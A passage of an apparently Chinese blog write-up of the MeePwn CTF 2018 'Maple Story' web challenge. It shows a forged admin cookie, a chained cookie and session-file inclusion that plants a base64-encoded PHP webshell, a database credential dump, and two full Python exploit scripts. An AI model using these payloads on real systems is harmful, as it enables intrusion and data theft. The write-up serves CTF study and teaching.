如果i==0，无法修改用户名，实际上salt对应的就是第二个密文块，直接取即可</span></span><br><span class="line">            cmp = change_and_check(junk)[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> cmp == change_and_check(junk[:i] + salt + j)[:<span class="number">32</span>]:</span><br><span class="line">                salt += j</span><br><span class="line">                <span class="built_in">print</span> salt</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">salt = crack_salt()</span><br></pre></td></tr></table></figure>
+
+<p>爆破得到<code>$salt</code> 为<code>ms_g00d_0ld_g4m3</code> ，然后计算出<code>admin</code> 用户的Cookie为<code> hashlib.sha256(&#39;admin&#39; + salt).hexdigest()</code>   也就是<code>_role=&#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#39; </code>。 </p>
+<p><img data-src="1532066767366.png" alt="1532066767366"></p>
+<p>可使用Fiddler的Filters功能设置请求头为<code>PHPSESSID=8es749ivbfetvsmsc0ggthr2e5; _role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe </code> ，权限上升为ADMIN。</p>
+<p><img data-src="1532072362986.png" alt="1532072362986"></p>
+<h1 id="以Cookie为跳板的Session文件包含"><a href="#以Cookie为跳板的Session文件包含" class="headerlink" title="以Cookie为跳板的Session文件包含"></a>以Cookie为跳板的Session文件包含</h1><h2 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h2><p>注意到Session文件中有部分明文信息，记录关于上一次的操作。每一次操作都会记录，但只有<code>admin.php</code>  中写入的内容存在可控变量：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pet&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pet&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$dir</span>=<span class="string">&#x27;./upload/&#x27;</span>.md5(<span class="variable">$salt</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    give_pet(<span class="variable">$dir</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;pet&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(check_available_pet(<span class="variable">$_POST</span>[<span class="string">&#x27;pet&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$log_content</span>=<span class="string">&#x27;[&#x27;</span>.date(<span class="string">&quot;h:i:sa&quot;</span>).<span class="string">&#x27; GMT+7] gave &#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pet&#x27;</span>].<span class="string">&#x27; to player &#x27;</span>.search_name_by_mail(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;action&#x27;</span>]=<span class="variable">$log_content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中的<code>search_name_by_mail($conn,$_POST[&#39;email&#39;]) </code> 正是用户名，而这是可修改的。所以只要在<code>CHARACTER</code> 页面执行一次送宠物给某个用户的操作，Session文件中就会出现该用户的用户名。而如果用户名是PHP代码，就会被执行。</p>
+<p>用户名修改有哪些限制？</p>
+<p>首先是<code>文件包含</code> 小节提到的所有<code>GET</code> ，<code>POST </code> 参数都必须经过的黑名单过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;	<span class="variable">$too_bad</span>=<span class="string">&quot;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&quot;</span>;</span><br><span class="line">	<span class="variable">$value</span> = preg_replace(<span class="variable">$too_bad</span>, str_repeat(<span class="string">&quot;*&quot;</span>,<span class="number">3</span>) ,<span class="variable">$value</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># |\/\/|\(.+\)|`.+`| 比较重要，意味着伪协议、函数、shell都不能直接使用。</span></span><br></pre></td></tr></table></figure>
+
+<p>然后是<code>setting.php</code> （代码见<code>CPA猜解salt</code> 小节）中要求的不大于22个字符。</p>
+<h2 id="character-php"><a href="#character-php" class="headerlink" title="character.php"></a>character.php</h2><p>所有功能中唯一一个直接写文件的操作在和<code>CHARACTER</code> 页面，同样需经过黑名单过滤，并且要求小于20个字符。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>])&gt;=<span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;strong&gt;Too Long&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        save_command(<span class="variable">$mail</span>,<span class="variable">$salt</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;command&#x27;</span>]);</span><br><span class="line">        header(<span class="string">&quot;Refresh:0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function save_command($email,$salt,$data)&#123;</span></span><br><span class="line"><span class="comment">	$dir=&#x27;./upload/&#x27;.md5($salt.$email);</span></span><br><span class="line"><span class="comment">	file_put_contents($dir.&#x27;/command.txt&#x27;, $data);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>全局共有两处可以修改文件，可以修改用户名以修改Session文件，也可在<code>CHARACTER</code> 页面修改<code>command.txt</code> ，但两处都是由<code>GET</code> 或<code>POST</code> 传的参，参数被黑名单过滤导致无法直接发挥作用。</p>
+<p>考虑到COOKIE没有被过滤，可以用作跳板，在Session文件中包含Cookie，在<code>command.txt</code> 写入编码后的无害字符串，在Cookie写入利用伪协议读取 <code>command.txt</code>  并解码的语句，就成功向Session文件写入了一句话。</p>
+<p>其实从哪个文件经由哪个变量跳到哪个文件是有多种可能的，但本题受限于长度这很可能是唯一的解法。</p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ul>
+<li>在SETTING处修改用户名为<code>&lt;?=include&quot;$_COOKIE[a]</code> </li>
+<li>在Fiddler的Filters处的Cookie后面添加上一条<code>a=php://filter/convert.base64-decode/resource=upload/ac8d37347a056bad2a852e4ef40de28a/command.txt </code></li>
+<li>在character处给宠物发一条命令 <code>PD89YCRfR0VUW2ZdYDs</code> 从而写入<code>command.txt</code> </li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PD89YCRfR0VUW2ZdYDs 可解码为 &lt;?=`$_GET[f]`;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1532072718776.png" alt="1532072718776"></p>
+<ul>
+<li>在admin处给自己送一只宠物</li>
+</ul>
+<p><img data-src="1532072632523.png" alt="1532072632523"></p>
+<p>使执行语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$log_content</span>=<span class="string">&#x27;[&#x27;</span>.date(<span class="string">&quot;h:i:sa&quot;</span>).<span class="string">&#x27; GMT+7] gave &#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pet&#x27;</span>].<span class="string">&#x27; to player &#x27;</span>.search_name_by_mail(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>而其中的<code>search_name_by_mail($conn,$_POST[&#39;email&#39;]</code> 正是用户名<code>&lt;?=include&quot;$_COOKIE[a]</code> </p>
+<p>所以包含session文件就可以把Cookie里的变量a 包含进来，而a又是command.txt解码后的结果，也就是一句话木马。这时就可以以f为密码传入任意命令了。</p>
+<ul>
+<li>读到数据库配置文件</li>
+</ul>
+<p><img data-src="1532073478518.png" alt="1532073478518"></p>
+<ul>
+<li>读到配置文件dbconnect.php </li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	define(<span class="string">&#x27;DBHOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">	define(<span class="string">&#x27;DBUSER&#x27;</span>, <span class="string">&#x27;mapl_story_user&#x27;</span>);</span><br><span class="line">	define(<span class="string">&#x27;DBPASS&#x27;</span>, <span class="string">&#x27;tsu_tsu_tsu_tsu&#x27;</span>); </span><br><span class="line">	define(<span class="string">&#x27;DBNAME&#x27;</span>, <span class="string">&#x27;mapl_story&#x27;</span>);</span><br><span class="line">	<span class="variable">$conn</span> = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME);</span><br><span class="line">	<span class="keyword">if</span> ( !<span class="variable">$conn</span> ) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Connection failed : &quot;</span> . mysql_error());</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后执行命令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;SELECT * FROM mapl_config;&#39;| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br><span class="line">或</span><br><span class="line">mysql -e&#39;select * from mapl_config&#39; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1532073884330.png" alt="1532073884330"></p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>也可参考脚本理清利用过程：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">character_name</span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(name=character_name, submit=<span class="string">&#x27;Edit&#x27;</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;?page=setting.php&quot;</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span>(<span class="params">user_email</span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(pet=<span class="string">&quot;babydragon&quot;</span>, email=user_email, submit=<span class="string">&quot;Give&quot;</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">&#x27;?page=admin.php&#x27;</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params">cmd=<span class="string">&quot;testcmd&quot;</span></span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(command=cmd, submit=<span class="string">&quot;Send&quot;</span>)</span><br><span class="line">    r = requests.post(</span><br><span class="line">        url + <span class="string">&quot;?page=character.php&quot;</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>(<span class="params">cmd=<span class="string">&#x27;uname&#x27;</span></span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(</span><br><span class="line">        page=<span class="string">&quot;/var/lib/php/sessions/sess_&quot;</span> + cookie[<span class="string">&#x27;PHPSESSID&#x27;</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie[&#x27;PHPSESSID&#x27;] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">&quot;http://178.128.87.16/&quot;</span></span><br><span class="line">user_email = <span class="string">&quot;ojbk@qq.com&quot;</span></span><br><span class="line">salt = <span class="string">&#x27;ms_g00d_0ld_g4m3&#x27;</span></span><br><span class="line">cookie = <span class="built_in">dict</span>(</span><br><span class="line">    PHPSESSID=<span class="string">&#x27;8es749ivbfetvsmsc0ggthr2e5&#x27;</span>,</span><br><span class="line">    _role=<span class="string">&#x27;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#x27;</span>,</span><br><span class="line">    a=<span class="string">&quot;php://filter/convert.base64-decode/resource=upload/%s/command.txt&quot;</span> %</span><br><span class="line">    hashlib.md5(salt + user_email).hexdigest())</span><br><span class="line">change_name(<span class="string">&#x27;&lt;?=include&quot;$_COOKIE[a]&#x27;</span>)</span><br><span class="line"><span class="comment"># 修改用户名使读Session文件时包含进Cookie[&#x27;a&#x27;]，即command.txt得base64解码</span></span><br><span class="line">cmd = base64.b64encode(<span class="string">&quot;&lt;?=`$_GET[f]`;&quot;</span>)  <span class="comment">#&#x27;PD89YCRfR0VUW2ZdYDs=&#x27;</span></span><br><span class="line">command(cmd[:<span class="number">19</span>])  <span class="comment"># 往command.txt写入base64编码的shell，缺少最后一个等号也可正常解码</span></span><br><span class="line">give_pet(user_email)  <span class="comment"># 使Session文件中的action值为&quot;Give $pet to  player $username&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;mysql -e&#x27;select * from mapl_config&#x27; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story&quot;</span></span><br><span class="line"><span class="built_in">print</span> shell(cmd)</span><br><span class="line"><span class="comment"># mapl_salt      mapl_key        mapl_now_get_your_flag</span></span><br><span class="line"><span class="comment"># ms_g00d_0ld_g4m3        You_Never_Guess_This_Tsug0d_1337        MeePwnCTF&#123;__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="另一种思路：拼接-SESSION-变量"><a href="#另一种思路：拼接-SESSION-变量" class="headerlink" title="另一种思路：拼接$_SESSION 变量"></a>另一种思路：拼接<code>$_SESSION</code> 变量</h1><p>另外， <a target="_blank" rel="noopener" href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html">这篇文章</a> 里提供的一种拼接<code>$_SESSION</code> 变量的做法虽不比前者综合利用多处缺陷的优雅，但最大化地利用了单点的缺陷，很有创意，值得学习。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">character_name</span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(name=character_name, submit=<span class="string">&#x27;Edit&#x27;</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">&quot;?page=setting.php&quot;</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span>(<span class="params">user_email</span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(pet=<span class="string">&quot;babydragon&quot;</span>, email=user_email, submit=<span class="string">&quot;Give&quot;</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">&#x27;?page=admin.php&#x27;</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>(<span class="params">cmd=<span class="string">&#x27;uname&#x27;</span></span>):</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(</span><br><span class="line">        page=<span class="string">&quot;/var/lib/php/sessions/sess_&quot;</span> + cookie[<span class="string">&#x27;PHPSESSID&#x27;</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie[&#x27;PHPSESSID&#x27;] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">&quot;http://178.128.87.16/&quot;</span></span><br><span class="line">user_email = <span class="string">&quot;mapl@qq.com&quot;</span></span><br><span class="line">salt = <span class="string">&#x27;ms_g00d_0ld_g4m3&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = <span class="built_in">dict</span>(</span><br><span class="line">    PHPSESSID=<span class="string">&#x27;8es749ivbfetvsmsc0ggthr2e5&#x27;</span>,</span><br><span class="line">    _role=<span class="string">&#x27;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span>(<span class="params">s</span>):</span></span><br><span class="line">    change_name(s)</span><br><span class="line">    give_pet(user_email)</span><br><span class="line">    <span class="built_in">print</span> s</span><br><span class="line">    <span class="built_in">print</span> shell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]=&#x27;*/&#x27;?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;;&#x27;?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;&quot;&#x27;?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;&lt;&#x27;?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;?&#x27;/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;=&#x27;/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27; &#x27;/*</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;`echo PD89YCRfR0VUWzFdYDsK|base64 -d &gt;&gt; upload/%s/command.txt`&#x27;</span> % hashlib.md5(</span><br><span class="line">    salt + user_email).hexdigest()</span><br><span class="line">payload3 = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;&#x27;/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;?&#x27;/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=&#x27;&gt;&#x27;/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]?&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxx</span>():</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload1.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload2:</span><br><span class="line">        p = <span class="string">&quot;&lt;?=$_SESSION[a].=&#x27;%s&#x27;/*&quot;</span> % c</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload3.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:-<span class="number">1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xxx()</span><br><span class="line"><span class="built_in">print</span> hashlib.md5(salt + user_email).hexdigest()</span><br><span class="line"><span class="comment"># 可通过运行结果理解payload的巧妙</span></span><br><span class="line"><span class="comment"># 结果存放在</span></span><br><span class="line"><span class="comment"># https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/maplStory_SESSION_CONCAT_result.txt</span></span><br><span class="line"><span class="comment"># shell at </span></span><br><span class="line"><span class="comment"># http://178.128.87.16/?page=upload/e500ec6d3d2b69fda8ff11b5b53b5ee2/command.txt&amp;1=ls</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1532114006803.png" alt="1532114006803"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/10418">https://ctftime.org/writeup/10418</a> </p>
+<p><a target="_blank" rel="noopener" href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html">MeePwn CTF 2018 Qual - Maple Story</a>   </p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="findneo 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/180719MeePwn_py3Inject/" rel="prev" title="Meepwn2018：PyCalx&PyCalx2——Python3的f-string与eval注入">
+      <i class="fa fa-chevron-left"></i> Meepwn2018：PyCalx&PyCalx2——Python3的f-string与eval注入
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/180727PenetrationTool/" rel="next" title="【译】渗透测试工具备忘录">
+      【译】渗透测试工具备忘录 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%A7%88"><span class="nav-number">1.</span> <span class="nav-text">概览</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">2.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#index-php"><span class="nav-number">2.1.</span> <span class="nav-text">index.php</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CPA%E7%8C%9C%E8%A7%A3salt"><span class="nav-number">3.</span> <span class="nav-text">CPA猜解salt</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#login-php"><span class="nav-number">3.1.</span> <span class="nav-text">login.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#setting-php"><span class="nav-number">3.2.</span> <span class="nav-text">setting.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">3.3.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A5Cookie%E4%B8%BA%E8%B7%B3%E6%9D%BF%E7%9A%84Session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">4.</span> <span class="nav-text">以Cookie为跳板的Session文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 